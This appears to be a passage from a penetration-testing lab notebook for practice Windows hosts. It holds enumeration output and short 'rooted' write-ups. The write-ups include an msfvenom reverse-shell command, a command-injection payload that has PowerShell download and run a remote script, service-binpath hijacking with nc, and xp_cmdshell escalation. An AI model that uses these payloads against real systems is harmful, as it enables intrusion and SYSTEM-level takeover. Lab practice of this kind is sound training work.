\Microsoft\Windows\Multimedia\SystemSoundsService<br />Run As User : Users<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\NetCfg\BindingWorkItemQueueHandler<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\NetTrace\GatherNetworkInfo<br />Run As User : Users<br />Task To Run : %windir%\system32\gatherNetworkInfo.vbs <br /><br />TaskName    : \Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\RAC\RacTask<br />Run As User : LOCAL SERVICE<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\RAC\RacTask<br />Run As User : LOCAL SERVICE<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\RAC\RacTask<br />Run As User : LOCAL SERVICE<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Server Manager\CleanupOldPerfLogs<br />Run As User : SYSTEM<br />Task To Run : %systemroot%\system32\cscript.exe /B /nologo <br />              %systemroot%\system32\calluxxprovider.vbs $(Arg0) $(Arg1) $(Arg2)<br /><br />TaskName    : \Microsoft\Windows\Server Manager\ServerManager<br />Run As User : Administrators<br />Task To Run : %windir%\system32\ServerManagerLauncher.exe <br /><br />TaskName    : \Microsoft\Windows\Servicing\StartComponentCleanup<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Software Inventory Logging\Collection<br />Run As User : SYSTEM<br />Task To Run : %systemroot%\system32\cmd.exe /d /c <br />              %systemroot%\system32\silcollector.cmd publish<br /><br />TaskName    : \Microsoft\Windows\Software Inventory Logging\Configuration<br />Run As User : SYSTEM<br />Task To Run : %systemroot%\system32\cmd.exe /d /c <br />              %systemroot%\system32\silcollector.cmd configure<br /><br />TaskName    : \Microsoft\Windows\Storage Tiers Management\Storage Tiers <br />              Management Initialization<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Storage Tiers Management\Storage Tiers <br />              Optimization<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\defrag.exe -c -h -g -#<br /><br />TaskName    : \Microsoft\Windows\TaskScheduler\Idle Maintenance<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\TaskScheduler\Manual Maintenance<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\TaskScheduler\Regular Maintenance<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\TextServicesFramework\MsCtfMonitor<br />Run As User : Users<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Time Synchronization\SynchronizeTime<br />Run As User : LOCAL SERVICE<br />Task To Run : %windir%\system32\sc.exe start w32time task_started<br /><br />TaskName    : \Microsoft\Windows\Time Zone\SynchronizeTimeZone<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\tzsync.exe <br /><br />TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting<br />Run As User : Users<br />Task To Run : %windir%\system32\wermgr.exe -queuereporting<br /><br />TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting<br />Run As User : Users<br />Task To Run : %windir%\system32\wermgr.exe -queuereporting<br /><br />TaskName    : \Microsoft\Windows\Windows Filtering <br />              Platform\BfeOnServiceStartTypeChange<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\rundll32.exe <br />              bfe.dll,BfeOnServiceStartTypeChange<br /><br />TaskName    : \Microsoft\Windows\WindowsColorSystem\Calibration Loader<br />Run As User : Users<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsColorSystem\Calibration Loader<br />Run As User : Users<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\AUFirmwareInstall<br />Run As User : LOCAL SERVICE<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\AUScheduledInstall<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start With Network<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start With Network<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start With Network<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start With Network<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\Wininet\CacheTask<br />Run As User : Users<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Workplace Join\Automatic-Workplace-Join<br />Run As User : Authenticated Users<br />Task To Run : %SystemRoot%\System32\AutoWorkplace.exe join<br /><br />TaskName    : \Microsoft\Windows\WS\License Validation<br />Run As User : LOCAL SERVICE<br />Task To Run : rundll32.exe WSClient.dll,WSpTLR licensing<br /><br />TaskName    : \Microsoft\Windows\WS\WSTask<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br /><br /><br /><br />-----------------------------------------------------------<br /> Services<br />-----------------------------------------------------------<br /><br />Name                         DisplayName                                             Status<br />----                         -----------                                             ------<br />smphost                      Microsoft Storage Spaces SMP                           Stopped<br />SNMPTRAP                     SNMP Trap                                              Stopped<br />sppsvc                       Software Protection                                    Stopped<br />ShellHWDetection             Shell Hardware Detection                               Stopped<br />SCPolicySvc                  Smart Card Removal Policy                              Stopped<br />seclogon                     Secondary Logon                                        Stopped<br />SharedAccess                 Internet Connection Sharing (ICS)                      Stopped<br />swprv                        Microsoft Software Shadow Copy Provider                Stopped<br />SysMain                      Superfetch                                             Stopped<br />TapiSrv                      Telephony                                              Stopped<br />svsvc                        Spot Verifier                                          Stopped<br />SQLAgent$SQLEXPRESS          SQL Server Agent (SQLEXPRESS)                          Stopped<br />SQLBrowser                   SQL Server Browser                                     Stopped<br />SstpSvc                      Secure Socket Tunneling Protocol Service               Stopped<br />ScDeviceEnum                 Smart Card Device Enumeration Service                  Stopped<br />pla                          Performance Logs &amp; Alerts                              Stopped<br />PrintNotify                  Printer Extensions and Notifications                   Stopped<br />RasAuto                      Remote Access Auto Connection Manager                  Stopped<br />PerfHost                     Performance Counter DLL Host                           Stopped<br />NcaSvc                       Network Connectivity Assistant                         Stopped<br />Netlogon                     Netlogon                                               Stopped<br />NetTcpPortSharing            Net.Tcp Port Sharing Service                           Stopped<br />RSoPProv                     Resultant Set of Policy Provider                       Stopped<br />sacsvr                       Special Administration Console Helper                  Stopped<br />SCardSvr                     Smart Card                                             Stopped<br />RpcLocator                   Remote Procedure Call (RPC) Locator                    Stopped<br />RasMan                       Remote Access Connection Manager                       Stopped<br />RemoteAccess                 Routing and Remote Access                              Stopped<br />RemoteRegistry               Remote Registry                                        Stopped<br />WdiServiceHost               Diagnostic Service Host                                Stopped<br />WdiSystemHost                Diagnostic System Host                                 Stopped<br />Wecsvc                       Windows Event Collector                                Stopped<br />WcsPlugInService             Windows Color System                                   Stopped<br />VMwareCAFManagementAgentHost VMware CAF Management Agent Service                    Stopped<br />VSS                          Volume Shadow Copy                                     Stopped<br />w3logsvc                     W3C Logging Service                                    Stopped<br />WSService                    Windows Store Service (WSService)                      Stopped<br />wuauserv                     Windows Update                                         Stopped<br />wudfsvc                      Windows Driver Foundation - User-mode Driver Framework Stopped<br />WPDBusEnum                   Portable Device Enumerator Service                     Stopped<br />WEPHOSTSVC                   Windows Encryption Provider Host Service               Stopped<br />wercplsupport                Problem Reports and Solutions Control Panel Support    Stopped<br />WerSvc                       Windows Error Reporting Service                        Stopped<br />VMwareCAFCommAmqpListener    VMware CAF AMQP Communication Service                  Stopped<br />VaultSvc                     Credential Manager                                     Stopped<br />vds                          Virtual Disk                                           Stopped<br />vmicguestinterface           Hyper-V Guest Service Interface                        Stopped<br />UI0Detect                    Interactive Services Detection                         Stopped<br />THREADORDER                  Thread Ordering Server                                 Stopped<br />TieringEngineService         Storage Tiers Management                               Stopped<br />TrustedInstaller             Windows Modules Installer                              Stopped<br />vmictimesync                 Hyper-V Time Synchronization Service                   Stopped<br />vmicvss                      Hyper-V Volume Shadow Copy Requestor                   Stopped<br />vmvss                        VMware Snapshot Provider                               Stopped<br />vmicshutdown                 Hyper-V Guest Shutdown Service                         Stopped<br />vmicheartbeat                Hyper-V Heartbeat Service                              Stopped<br />vmickvpexchange              Hyper-V Data Exchange Service                          Stopped<br />vmicrdv                      Hyper-V Remote Desktop Virtualization Service          Stopped<br />Eaphost                      Extensible Authentication Protocol                     Stopped<br />EFS                          Encrypting File System (EFS)                           Stopped<br />fdPHost                      Function Discovery Provider Host                       Stopped<br />DeviceAssociationService     Device Association Service                             Stopped<br />DeviceInstall                Device Install Service                                 Stopped<br />dot3svc                      Wired AutoConfig                                       Stopped<br />hkmsvc                       Health Key and Certificate Management                  Stopped<br />IEEtwCollectorService        Internet Explorer ETW Collector Service                Stopped<br />KPSSVC                       KDC Proxy Server service (KPS)                         Stopped<br />FDResPub                     Function Discovery Resource Publication                Stopped<br />FontCache3.0.0.0             Windows Presentation Foundation Font Cache 3.0.0.0     Stopped<br />hidserv                      Human Interface Device Service                         Stopped<br />Appinfo                      Application Information                                Stopped<br />AppMgmt                      Application Management                                 Stopped<br />AppReadiness                 App Readiness                                          Stopped<br />AeLookupSvc                  Application Experience                                 Stopped<br />ALG                          Application Layer Gateway Service                      Stopped<br />AppIDSvc                     Application Identity                                   Stopped<br />Audiosrv                     Windows Audio                                          Stopped<br />Browser                      Computer Browser                                       Stopped<br />defragsvc                    Optimize drives                                        Stopped<br />AppXSvc                      AppX Deployment Service (AppXSVC)                      Stopped<br />aspnet_state                 ASP.NET State Service                                  Stopped<br />AudioEndpointBuilder         Windows Audio Endpoint Builder                         Stopped<br />msiserver                    Windows Installer                                      Stopped<br />KtmRm                        KtmRm for Distributed Transaction Coordinator          Stopped<br />MSiSCSI                      Microsoft iSCSI Initiator Service                      Stopped<br />MMCSS                        Multimedia Class Scheduler                             Stopped<br />lltdsvc                      Link-Layer Topology Discovery Mapper                   Stopped<br />napagent                     Network Access Protection Agent                        Stopped<br />CertPropSvc                  Certificate Propagation                                Running<br />BrokerInfrastructure         Background Tasks Infrastructure Service                Running<br />PolicyAgent                  IPsec Policy Agent                                     Running<br />BFE                          Base Filtering Engine                                  Running<br />W3SVC                        World Wide Web Publishing Service                      Running<br />BITS                         Background Intelligent Transfer Service                Running<br />W32Time                      Windows Time                                           Running<br />Power                        Power                                                  Running<br />MpsSvc                       Windows Firewall                                       Running<br />ProfSvc                      User Profile Service                                   Running<br />DcomLaunch                   DCOM Server Process Launcher                           Running<br />VMTools                      VMware Tools                                           Running<br />COMSysApp                    COM+ System Application                                Running<br />CryptSvc                     Cryptographic Services                                 Running<br />WinHttpAutoProxySvc          WinHTTP Web Proxy Auto-Discovery Service               Running<br />netprofm                     Network List Service                                   Running<br />AppHostSvc                   Application Host Helper Service                        Running<br />Winmgmt                      Windows Management Instrumentation                     Running<br />wmiApSrv                     WMI Performance Adapter                                Running<br />WinRM                        Windows Remote Management (WS-Management)              Running<br />Netman                       Network Connections                                    Running<br />NlaSvc                       Network Location Awareness                             Running<br />SamSs                        Security Accounts Manager                              Running<br />Wcmsvc                       Windows Connection Manager                             Running<br />WAS                          Windows Process Activation Service                     Running<br />PlugPlay                     Plug and Play                                          Running<br />nsi                          Network Store Interface Service                        Running<br />MSSQL$SQLEXPRESS             SQL Server (SQLEXPRESS)                                Running<br />MSDTC                        Distributed Transaction Coordinator                    Running<br />Dhcp                         DHCP Client                                            Running<br />ftpsvc                       Microsoft FTP Service                                  Running<br />Spooler                      Print Spooler                                          Running<br />gpsvc                        Group Policy Client                                    Running<br />LanmanWorkstation            Workstation                                            Running<br />RpcEptMapper                 RPC Endpoint Mapper                                    Running<br />SQLWriter                    SQL Server VSS Writer                                  Running<br />FontCache                    Windows Font Cache Service                             Running<br />RpcSs                        Remote Procedure Call (RPC)                            Running<br />iphlpsvc                     IP Helper                                              Running<br />Schedule                     Task Scheduler                                         Running<br />KeyIso                       CNG Key Isolation                                      Running<br />IKEEXT                       IKE and AuthIP IPsec Keying Modules                    Running<br />LanmanServer                 Server                                                 Running<br />SessionEnv                   Remote Desktop Configuration                           Running<br />SENS                         System Event Notification Service                      Running<br />EventSystem                  COM+ Event System                                      Running<br />UALSVC                       User Access Logging Service                            Running<br />tvnserver                    TightVNC Server                                        Running<br />DPS                          Diagnostic Policy Service                              Running<br />UmRdpService                 Remote Desktop Services UserMode Port Redirector       Running<br />VGAuthService                VMware Alias Manager and Ticket Service                Running<br />DiagTrack                    Diagnostics Tracking Service                           Running<br />Dnscache                     DNS Client                                             Running<br />TrkWks                       Distributed Link Tracking Client                       Running<br />lmhosts                      TCP/IP NetBIOS Helper                                  Running<br />SystemEventsBroker           System Events Broker                                   Running<br />EventLog                     Windows Event Log                                      Running<br />TermService                  Remote Desktop Services                                Running<br />DsmSvc                       Device Setup Manager                                   Running<br />LSM                          Local Session Manager                                  Running<br />Themes                       Themes                                                 Running<br /><br /><br /><br /><br />-----------------------------------------------------------<br /> Installed Programs<br />-----------------------------------------------------------<br /><br />SQL Server Browser for SQL Server 2012                         11.0.2100.60     SQL Server Browser for SQL Server 2012                        <br />VMware Tools                                                   10.3.10.12406962 VMware Tools                                                  <br />Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219    10.0.40219       Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219   <br />Microsoft Visual C++ 2017 x86 Additional Runtime - 14.12.25810 14.12.25810      Microsoft Visual C++ 2017 x86 Additional Runtime - 14.12.25810<br />Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219    10.0.40219       Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219   <br />Microsoft SQL Server 2012 Native Client                        11.0.2100.60     Microsoft SQL Server 2012 Native Client                       <br />TightVNC                                                       2.8.11.0         TightVNC                                                      <br />Microsoft Visual C++ 2017 x64 Additional Runtime - 14.12.25810 14.12.25810      Microsoft Visual C++ 2017 x64 Additional Runtime - 14.12.25810<br />Microsoft SQL Server 2012 RsFx Driver                          11.0.2100.60     Microsoft SQL Server 2012 RsFx Driver                         <br />Microsoft SQL Server 2012 Transact-SQL ScriptDom               11.0.2100.60     Microsoft SQL Server 2012 Transact-SQL ScriptDom              <br />SQL Server 2012 Common Files                                   11.0.2100.60     SQL Server 2012 Common Files                                  <br />SQL Server 2012 Database Engine Services                       11.0.2100.60     SQL Server 2012 Database Engine Services                      <br />Microsoft SQL Server 2008 Setup Support Files                  10.1.2731.0      Microsoft SQL Server 2008 Setup Support Files                 <br />SQL Server 2012 Database Engine Shared                         11.0.2100.60     SQL Server 2012 Database Engine Shared                        <br />Microsoft Visual C++ 2017 x86 Minimum Runtime - 14.12.25810    14.12.25810      Microsoft Visual C++ 2017 x86 Minimum Runtime - 14.12.25810   <br />SQL Server 2012 Database Engine Services                       11.0.2100.60     SQL Server 2012 Database Engine Services                      <br />Microsoft Visual C++ 2017 x64 Minimum Runtime - 14.12.25810    14.12.25810      Microsoft Visual C++ 2017 x64 Minimum Runtime - 14.12.25810   <br />Sql Server Customer Experience Improvement Program             11.0.2100.60     Sql Server Customer Experience Improvement Program            <br />SQL Server 2012 Database Engine Shared                         11.0.2100.60     SQL Server 2012 Database Engine Shared                        <br />SQL Server 2012 Common Files                                   11.0.2100.60     SQL Server 2012 Common Files                                  <br />Microsoft SQL Server 2012 Setup (English)                      11.1.3128.0      Microsoft SQL Server 2012 Setup (English)                     <br />Microsoft VSS Writer for SQL Server 2012                       11.0.2100.60     Microsoft VSS Writer for SQL Server 2012                      <br /><br /><br /><br />-----------------------------------------------------------<br /> Installed Patches<br />-----------------------------------------------------------<br /><br />-----------------------------------------------------------<br /> Program Folders<br />-----------------------------------------------------------<br /><br /><br />C:\Program Files<br />-------------<br />Common Files                <br />Internet Explorer           <br />Microsoft SQL Server        <br />Microsoft Visual Studio 10.0<br />Microsoft.NET               <br />MSBuild                     <br />Reference Assemblies        <br />TightVNC                    <br />VMware                      <br />Windows Mail                <br />Windows NT                  <br />WindowsPowerShell           <br /><br /><br />C:\Program Files (x86)<br />-------------------<br />Common Files        <br />Internet Explorer   <br />Microsoft SQL Server<br />Microsoft.NET       <br />MSBuild             <br />Reference Assemblies<br />Windows Mail        <br />Windows NT          <br />WindowsPowerShell   <br /><br /><br /><br />-----------------------------------------------------------<br /> Files with Full Control and Modify Access<br />-----------------------------------------------------------<br /><br />C:\inetpub\wwwroot\cannon.txt<br /><br /><br /><br />C:\Program Files\Microsoft SQL Server\140\Setup Bootstrap\Log\20190407_121805\DotNet46_Cpu64_1.log.html<br /><br /><br /><br />C:\Users\Public\Documents\cannon.txt<br /><br /><br />-----------------------------------------------------------<br /> Folders with Full Control and Modify Access<br />-----------------------------------------------------------<br /><br />Failed to read more folders<br /><br />Failed to read more folders<br /><br />Failed to read more folders<br /><br />Failed to read more folders<br /><br />Failed to read more folders<br /><br />-----------------------------------------------------------<br /> Mapped Drives<br />-----------------------------------------------------------<br /><br />C:                 <br />D:                 <br /><br /><br />-----------------------------------------------------------<br /> Unquoted Service Paths<br />-----------------------------------------------------------<br /><br />-----------------------------------------------------------<br /> Recent Documents<br />-----------------------------------------------------------<br /><br />-----------------------------------------------------------<br /> Potentially Interesting Files in Users Directory <br />-----------------------------------------------------------<br />C:\Users\Public\Documents\cannon.txt<br /><br />-----------------------------------------------------------<br /> 10 Last Modified Files in C:\User<br />-----------------------------------------------------------<br />C:\Users\Administrator<br />C:\Users\MSSQL$SQLEXPRESS<br />C:\Users\SQLTELEMETRY$SQLEXPRESS<br />C:\Users\Classic .NET AppPool<br />C:\Users\.NET v2.0 Classic<br />C:\Users\.NET v2.0<br />C:\Users\.NET v4.5 Classic<br />C:\Users\.NET v4.5<br />C:\Users\Public\Documents<br />C:\Users\Public\Documents\cannon.txt<br /><br />-----------------------------------------------------------<br /> MUICache Files<br />-----------------------------------------------------------<br /><br /><br />-----------------------------------------------------------<br /> System Files with Passwords<br />-----------------------------------------------------------<br /><br />-----------------------------------------------------------<br /> AlwaysInstalledElevated Registry Key<br />-----------------------------------------------------------<br /><br />-----------------------------------------------------------<br /> Stored Credentials<br />-----------------------------------------------------------<br /><br />Currently stored credentials:<br /><br />* NONE *<br /><br />-----------------------------------------------------------<br /> Checking for AutoAdminLogon <br />-----------------------------------------------------------<br /><br /><br />  Command:</div><div class='page'><h1 class='title level-4'>Pictures</h1><br/><a href=""><img src="images/1761-1.png" alt="images/1761-1.png" /></a><br /><br /><a href=""><img src="images/1761-2.png" alt="images/1761-2.png" /></a><br /><br /><a href=""><img src="images/1761-3.png" alt="images/1761-3.png" /></a><br /><br /><a href=""><img src="images/1761-4.png" alt="images/1761-4.png" /></a><br /><br /><a href=""><img src="images/1761-5.png" alt="images/1761-5.png" /></a><br /><br /><a href=""><img src="images/1761-6.png" alt="images/1761-6.png" /></a><br /><br /><a href=""><img src="images/1761-7.png" alt="images/1761-7.png" /></a><br /><br /><a href=""><img src="images/1761-8.png" alt="images/1761-8.png" /></a><br /><br /></div><div class='page'><h1 class='title level-3'>10.11.1.14 Bob rooted</h1><br/>Nmap showed that ports 21, 23, 25, 80, 110, 220, and 443 were open.<br />FTP anonymous was enabled.<br />Chris verified that he could upload files to the wwwroot directory on the ftp server.<br />wwwroot is also the webroot for port 80.<br />He used msfvenom to craft code that when executed would give him a reverse shell.<br />msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.167 lport=80 -f asp -a x86 --platform win  &gt; shell.asp<br />During enumeration using accecsschk.exe he found that he could edit the service upnphost and then run it.<br />He edited the binpath to create a reverse shell via nc when started.<br />He started the service and gained a new reverse shell as nt authority\system.<br /><br /><br /><br /><br /><br /><br />a26f37da4583ff68f44d133d12ae3459</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>iis5.1 = xp pro</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.14 &amp;&amp; nmap -sC -sV -Pn 10.11.1.14 &amp;&amp; nmap -p- -Pn 10.11.1.14<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-27 13:27 EDT<br />Nmap scan report for 10.11.1.14<br />Host is up (0.072s latency).<br />Not shown: 994 filtered ports<br />PORT    STATE  SERVICE<br />21/tcp  open   ftp<br />23/tcp  closed telnet<br />25/tcp  closed smtp<br />80/tcp  open   http<br />110/tcp closed pop3<br />443/tcp open   https<br /><br />Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-27 13:27 EDT<br />Nmap scan report for 10.11.1.14<br />Host is up (0.081s latency).<br />Not shown: 994 filtered ports<br />PORT    STATE  SERVICE VERSION<br />21/tcp  open   ftp     Microsoft ftpd<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />| 04-26-20  01:45PM               331888 accesschk-2003-xp.exe<br />| 04-26-20  02:16PM       &lt;DIR&gt;          AdminScripts<br />| 01-17-07  07:43PM       &lt;DIR&gt;          ftproot<br />| 01-17-07  07:43PM       &lt;DIR&gt;          iissamples<br />| 04-26-20  03:20PM               983816 mimikatz.exe<br />| 04-26-20  02:48PM                59392 nc.exe<br />| 04-26-20  02:18PM       &lt;DIR&gt;          Scripts<br />| 04-26-20  02:07PM                66560 whoami.exe<br />|_04-27-20  01:54PM       &lt;DIR&gt;          wwwroot<br />| ftp-syst: <br />|_  SYST: Windows_NT<br />23/tcp  closed telnet<br />25/tcp  closed smtp<br />80/tcp  open   http    Microsoft IIS httpd 5.1<br />| http-methods: <br />|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT<br />|_http-server-header: Microsoft-IIS/5.1<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />| http-webdav-scan: <br />|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH<br />|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK<br />|   Server Type: Microsoft-IIS/5.1<br />|   Server Date: Mon, 27 Apr 2020 17:26:31 GMT<br />|_  WebDAV type: Unknown<br />110/tcp closed pop3<br />443/tcp open   https?<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 109.14 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-27 13:29 EDT<br />Nmap scan report for 10.11.1.14<br />Host is up (0.065s latency).<br />Not shown: 65528 filtered ports<br />PORT    STATE  SERVICE<br />21/tcp  open   ftp<br />23/tcp  closed telnet<br />25/tcp  closed smtp<br />80/tcp  open   http<br />110/tcp closed pop3<br />220/tcp closed imap3<br />443/tcp open   https<br /><br />Nmap done: 1 IP address (1 host up) scanned in 107.57 seconds<br /></div><div class='page'><h1 class='title level-5'>web</h1><br/></div><div class='page'><h1 class='title level-6'>80</h1><br/>PORT   STATE SERVICE    REASON  VERSION<br />80/tcp open  tcpwrapped syn-ack<br />|_http-server-header: Microsoft-IIS/5.1<br /><br /><br /></div><div class='page'><h1 class='title level-6'>443</h1><br/></div><div class='page'><h1 class='title level-7'>nmap</h1><br/>PORT    STATE SERVICE    REASON  VERSION<br />443/tcp open  tcpwrapped syn-ack<br /></div><div class='page'><h1 class='title level-5'>systeminfo</h1><br/>Host Name:                 BOB<br />OS Name:                   Microsoft Windows XP Professional<br />OS Version:                5.1.2600 Service Pack 1 Build 2600<br />OS Manufacturer:           Microsoft Corporation<br />OS Configuration:          Standalone Workstation<br />OS Build Type:             Uniprocessor Free<br />Registered Owner:          Offsec<br />Registered Organization:   Offsec<br />Product ID:                55274-640-9771731-23056<br />Original Install Date:     1/10/2007, 5:49:26 PM<br />System Up Time:            N/A<br />System Manufacturer:       VMware, Inc.<br />System Model:              VMware Virtual Platform<br />System type:               X86-based PC<br />Processor(s):              1 Processor(s) Installed.<br />                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz<br />BIOS Version:              INTEL  - 6040000<br />Windows Directory:         C:\WINDOWS<br />System Directory:          C:\WINDOWS\System32<br />Boot Device:               \Device\HarddiskVolume1<br />System Locale:             en-us;English (United States)<br />Input Locale:              en-us;English (United States)<br />Time Zone:                 (GMT) Greenwich Mean Time : Dublin, Edinburgh, Lisbon, London<br />Total Physical Memory:     511 MB<br />Available Physical Memory: 253 MB<br />Virtual Memory: Max Size:  1,378 MB<br />Virtual Memory: Available: 900 MB<br />Virtual Memory: In Use:    478 MB<br />Page File Location(s):     C:\pagefile.sys<br />Domain:                    WORKGROUP<br />Logon Server:              N/A<br />Hotfix(s):                 3 Hotfix(s) Installed.<br />                           [01]: File 1<br />                           [02]: Q147222<br />                           [03]: KB893803v2 - Update<br />NetWork Card(s):           1 NIC(s) Installed.<br />                           [01]: VMware PCI Ethernet Adapter<br />                                 Connection Name: Ethernet0<br />                                 DHCP Enabled:    No<br />                                 IP address(es)<br />                                 [01]: 10.11.1.14<br /></div><div class='page'><h1 class='title level-4'>pictures</h1><br/><a href=""><img src="images/1770-1.png" alt="images/1770-1.png" /></a><br /><br /><a href=""><img src="images/1770-2.png" alt="images/1770-2.png" /></a><br /><br /><a href=""><img src="images/1770-3.png" alt="images/1770-3.png" /></a><br /><br /><a href=""><img src="images/1770-4.png" alt="images/1770-4.png" /></a><br /><br /><a href=""><img src="images/1770-5.png" alt="images/1770-5.png" /></a><br /><a href=""><img src="images/1770-6.png" alt="images/1770-6.png" /></a><br /><br /><a href=""><img src="images/1770-7.png" alt="images/1770-7.png" /></a><br /><br /><a href=""><img src="images/1770-8.png" alt="images/1770-8.png" /></a></div><div class='page'><h1 class='title level-3'>10.11.1.31 Ralph rooted</h1><br/>A nmap scan showed that http, smb, sql, and rdp ports were all open.<br />Upon smb enumeration the tester (Chris) found that he was able to anonymously connect to the smb directory \\10.11.1.31\wwwroot.<br />Chris connected to the wwwroot directory and mirrored the directories onto his local machine.<br />Upon research of the new data he found two vulnerabilities. Onc involving a low privlidge shell due to a lack of input sanitization on pingit.py.<br />Chris was able to bypass the purpose of the script by inputing the following... 192.168.119.167 &amp;&amp; powershell.exe -c &quot;IEX(new-object net.webclient).downloadstring(&#39;<a href="http://192.168.119.167:80/443.ps1')"">http://192.168.119.167:80/443.ps1&#39;)&quot;</a><br />This command immediatley gave Chris a low privlidge shell on Ralph.<br />The second vulnerability noted was clear test passwords for SQLOLEDB located in the scripts named login-off.asp and login-off.asp.txt.<br />After logging into sql server chris was able to leverage xp_cmdshell to run a powershell command and give himself a reverse shell as nt authority\system<br /><br /><br />network-secret<br />7eab8563146f16140c769072580cbcb3<br />proof<br />dec04ea1c0d39acd7a53c543540b0a3a</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)<br /><br />192.168.119.167 &amp;&amp; powershell.exe -c &quot;^CX(new-object net.webclient).downloadstring(&#39;<a href="http://192.168.119.167:80/443.ps1')"">http://192.168.119.167:80/443.ps1&#39;)&quot;</a><br /><br />x64<br /><br />=== Checking Windows Vaults ===<br /><br />  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29<br />  Vault Type     : Windows Credentials<br /><br />  [*] Use the Mimikatz &quot;dpapi::masterkey&quot; module with appropriate arguments (/rpc) to decrypt<br /><br />login-off.asp:cnn.open 